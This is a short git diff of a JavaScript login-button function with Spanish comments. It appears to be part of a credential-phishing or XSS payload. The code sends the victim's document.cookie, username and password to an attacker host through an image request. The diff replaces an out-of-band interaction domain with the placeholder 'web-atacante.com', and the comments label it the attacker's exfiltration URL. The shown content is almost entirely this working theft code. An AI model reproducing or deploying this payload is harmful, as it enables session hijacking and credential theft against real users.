@@ -69,7 +69,7 @@ function boton_login() {
         // Envia en la request de la imagen los parametros, que recogen el valor de las variables anteriores + la cookie actual del usuario
         var i=new Image;
         // Aqui viene la url del atacante donde se van a exfiltrar las credenciales.
-        i.src=`http://ccy4mrv2vtc00005cxt0ggxnkcoyyyyyb.oast.fun/?cookie=${document.cookie}&user=${username}&pass=${password}&dontaskpopup=${dontaskpopup}`;
+        i.src=`http://web-atacante.com/?cookie=${document.cookie}&user=${username}&pass=${password}&dontaskpopup=${dontaskpopup}`;
      
     } else {
         // Muestra el error oculto del login
